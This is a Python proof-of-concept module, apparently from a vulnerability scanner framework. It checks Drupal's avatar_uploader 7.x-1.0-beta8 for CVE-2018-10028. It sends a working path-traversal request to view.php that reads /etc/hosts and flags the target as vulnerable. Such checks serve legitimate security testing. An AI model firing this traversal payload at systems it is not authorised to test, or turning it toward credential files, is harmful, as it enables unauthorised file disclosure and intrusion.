# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import datetime


class Vuln(ABVuln):
    vuln_id = 'Drupal_0007'  # 平台漏洞编号
    name = 'Drupal avatar_uploader任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2018-05-03'  # 漏洞公布时间
    desc = '''
    avatar_uploader 7.x-1.0-beta8版本中存在安全漏洞，该漏洞源于view.php文件中的代码未能校验用户或过滤文件路径。攻击者可利用该漏洞下载任意文件。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08816'
    cnvd_id = 'CNVD-2018-08816'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10028'  # cve编号
    product = 'Drupal'  # 漏洞组件名称
    product_version = 'avatar_uploader 7.x-1.0-beta8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e52983bc-cc8d-4cfe-a4d8-3e233f8d5a41'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            self.output.info('正在尝试读取/etc/hosts文件信息')
            payload = "/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../../../../../../etc/hosts"
            vul_url = arg + payload
            response = requests.get(vul_url)
            if response.status_code == 200 and 'localhost' in response.text:
                self.output.info('读取/etc/hosts文件信息成功')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
